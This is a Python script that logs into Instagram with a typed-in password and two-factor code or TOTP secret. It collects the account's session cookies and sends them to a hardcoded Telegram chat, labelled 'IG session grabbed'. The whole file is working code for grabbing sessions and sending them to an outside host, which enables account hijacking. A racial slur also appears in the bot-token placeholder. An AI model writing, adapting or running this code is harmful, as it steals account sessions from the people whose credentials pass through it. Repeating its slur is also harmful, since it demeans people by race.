import base64
import hashlib
import hmac
import re
import struct
import sys
import time
import requests

wlzbiBase = 'https://www.instagram.com'
WLZbiLoginPage = f'{wlzbiBase}/accounts/login/'
wlzbiLoginApi = f'{wlzbiBase}/api/v1/web/accounts/login/ajax/'
Wlzbi2faApi = f'{wlzbiBase}/api/v1/web/accounts/login/ajax/two_factor/'
wlzbiTgApi = 'https://api.telegram.org/bot{token}/sendMessage'
WLZbiUa = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
wlzbiTimeout = 20
WLZbiTgToken = 'YOUR BOT TOKEN NIGGERS'
wlzbiTgChatId = '8712146330'


def wlzbiSession():
    s = requests.Session()
    s.headers.update({'User-Agent': WLZbiUa, 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.9', 'X-Requested-With': 'XMLHttpRequest', 'Origin': wlzbiBase, 'Referer': WLZbiLoginPage})
    return s


def wlzbiCsrf(s):
    r = s.get(WLZbiLoginPage, timeout=wlzbiTimeout)
    r.raise_for_status()
    m = re.search('"csrf_token":"([^"]+)"', r.text)
    if m:
        return m.group(1)
    m = re.search('name="csrfmiddlewaretoken"\\s+value="([^"]+)"', r.text)
    if m:
        return m.group(1)
    return s.cookies.get('csrftoken')


def wlzbiTotp(secret):
    raw = re.sub('\\s+', '', secret).upper()
    key = base64.b32decode(raw + '=' * (-len(raw) % 8))
    counter = struct.pack('>Q', int(time.time() // 30))
    digest = hmac.new(key, counter, hashlib.sha1).digest()
    offset = digest[-1] & 15
    code = struct.unpack('>I', digest[offset:offset + 4])[0] & 2147483647
    return f'{code % 1000000:06d}'


def wlzbiLogin(s, username, password):
    csrf = wlzbiCsrf(s)
    if not csrf:
        raise RuntimeError('csrf token not found on login page')
    s.headers['X-CSRFToken'] = csrf
    s.cookies.set('csrftoken', csrf, domain='.instagram.com')
    payload = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}', 'queryParams': '{}', 'optIntoOneTap': 'false', 'stopDeletionNonce': '', 'trustedDeviceRecordsAllowed': 'false'}
    r = s.post(wlzbiLoginApi, data=payload, timeout=wlzbiTimeout)
    try:
        return r.json()
    except ValueError:
        raise RuntimeError(f'non-json login response: {r.status_code} {r.text[:200]}')


def wlzbi2fa(s, username, info, code):
    totp_on = info.get('totp_two_factor_on')
    method = '3' if totp_on else '1'
    payload = {'username': username, 'verificationCode': code, 'identifier': info.get('two_factor_identifier', ''), 'verification_method': method, 'queryParams': '{}', 'trust_signal': 'true'}
    if info.get('encrypted_context'):
        payload['encrypted_context'] = info['encrypted_context']
    if info.get('device_id'):
        payload['device_id'] = info['device_id']
    s.headers['X-CSRFToken'] = s.cookies.get('csrftoken') or ''
    r = s.post(Wlzbi2faApi, data=payload, timeout=wlzbiTimeout)
    try:
        return r.json()
    except ValueError:
        raise RuntimeError(f'non-json 2fa response: {r.status_code} {r.text[:200]}')


def wlzbiTg(text):
    url = wlzbiTgApi.format(token=WLZbiTgToken)
    payload = {'chat_id': wlzbiTgChatId, 'text': text, 'parse_mode': 'HTML', 'disable_web_page_preview': 'true'}
    r = requests.post(url, data=payload, timeout=wlzbiTimeout)
    try:
        data = r.json()
    except ValueError:
        return (False, f'tg non-json {r.status_code}')
    if data.get('ok'):
        return (True, 'sent')
    return (False, data.get('description', 'unknown tg error'))


def wlzbiMsg(username, s):
    sid = s.cookies.get('sessionid')
    dsid = s.cookies.get('ds_user_id')
    csrf = s.cookies.get('csrftoken')
    mid = s.cookies.get('mid')
    igd = s.cookies.get('ig_did')
    lines = ['<b>IG session grabbed</b>', f'<b>user</b>     : <code>{username}</code>', f'<b>sessionid</b>: <code>{sid}</code>', f'<b>ds_user_id</b>: <code>{dsid}</code>', f'<b>csrftoken</b>: <code>{csrf}</code>', f'<b>mid</b>      : <code>{mid}</code>', f'<b>ig_did</b>   : <code>{igd}</code>', f'<b>cookies</b>  : {len(s.cookies)}', f'<b>time</b>     : {int(time.time())}']
    return '\n'.join(lines)


def wlzbiReport(username, s):
    print()
    print('[+] login ok')
    print(f'    username   : {username}')
    print(f"    sessionid  : {s.cookies.get('sessionid')}")
    print(f"    ds_user_id : {s.cookies.get('ds_user_id')}")
    print(f"    csrftoken  : {s.cookies.get('csrftoken')}")
    print(f"    mid        : {s.cookies.get('mid')}")
    print(f"    ig_did     : {s.cookies.get('ig_did')}")
    print(f'    cookies    : {len(s.cookies)}')


def wlzbiFin(username, s):
    wlzbiReport(username, s)
    msg = wlzbiMsg(username, s)
    ok, info = wlzbiTg(msg)
    if ok:
        print(f'[+] telegram: {info}')
        return 0
    print(f'[-] telegram failed: {info}')
    return 1


def wlzbiRun():
    if WLZbiTgToken.startswith('PASTE_') or wlzbiTgChatId.startswith('PASTE_'):
        print('[-] set WLZbiTgToken and wlzbiTgChatId at top of script first')
        return 2
    username = input('username: ').strip()
    if not username:
        print('[-] username empty')
        return 2
    password = input('password: ').strip()
    if not password:
        print('[-] password empty')
        return 2
    s = wlzbiSession()
    print(f'[*] logging in as {username}')
    result = wlzbiLogin(s, username, password)
    if result.get('status') == 'ok' and result.get('authenticated'):
        return wlzbiFin(username, s)
    if not result.get('two_factor_required'):
        msg = result.get('message') or result.get('status') or 'unknown'
        print(f'[-] login failed: {msg}')
        return 1
    info = result.get('two_factor_info') or {}
    print('[*] two-factor required')
    if info.get('totp_two_factor_on'):
        print('[*] authenticator app enabled')
    if info.get('sms_two_factor_on'):
        phone = info.get('obfuscated_phone_number') or ''
        print(f'[*] sms enabled {phone}')
    secret = input('totp secret (blank to type a code): ').strip()
    if secret:
        try:
            code = wlzbiTotp(secret)
        except Exception as exc:
            print(f'[-] totp secret invalid: {exc}')
            return 1
        print(f'[*] generated totp: {code}')
    else:
        code = input('code (6-digit totp/sms or 8-digit backup): ').strip()
    if not code:
        print('[-] no code supplied')
        return 1
    print('[*] submitting 2fa')
    tf = wlzbi2fa(s, username, info, code)
    if tf.get('status') == 'ok' and tf.get('authenticated'):
        return wlzbiFin(username, s)
    if tf.get('two_factor_required'):
        print('[-] code rejected, 2fa still required')
        return 1
    if tf.get('message') == 'checkpoint_required' or tf.get('checkpoint_url'):
        url = tf.get('checkpoint_url') or ''
        print(f'[!] checkpoint required: {url}')
        return 1
    msg = tf.get('message') or tf.get('status') or 'unknown'
    print(f'[-] 2fa failed: {msg}')
    return 1


if __name__ == '__main__':
    try:
        sys.exit(wlzbiRun())
    except KeyboardInterrupt:
        print('\n[-] aborted')
        sys.exit(130)
    except requests.RequestException as exc:
        print(f'[-] network error: {exc}')
        sys.exit(1)
    except RuntimeError as exc:
        print(f'[-] {exc}')
        sys.exit(1)
